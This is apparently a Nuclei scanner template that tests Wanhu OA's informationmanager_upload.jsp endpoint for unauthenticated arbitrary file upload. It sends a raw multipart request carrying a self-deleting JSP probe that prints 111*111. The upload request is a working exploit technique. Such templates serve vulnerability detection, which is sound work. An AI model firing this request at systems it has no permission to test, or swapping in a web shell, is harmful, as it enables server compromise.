id: wanhu-oa-informationmanager-upload

info:
  name: wanhu-oa-informationmanager-upload
  author: msk
  severity: high

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{rand_base(16)}}"

http:
  - raw:
      - |
        POST /defaultroot/information_manager/informationmanager_upload.jsp?upload=1&dispControl=null&saveControl=null HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Length: 313
        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{boundary}}
        Accept-Encoding: gzip, deflate, br
        Connection: close

        ------WebKitFormBoundary{{boundary}}
        Content-Disposition: form-data; name="file1"; filename="test123ldh.jsp"
        Content-Type: application/octet-stream

        <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        ------WebKitFormBoundary{{boundary}}--

    matchers:
      - type: dsl
        dsl:
          - "status_code==200 && contains_all(body,'test123ldh.jsp') "

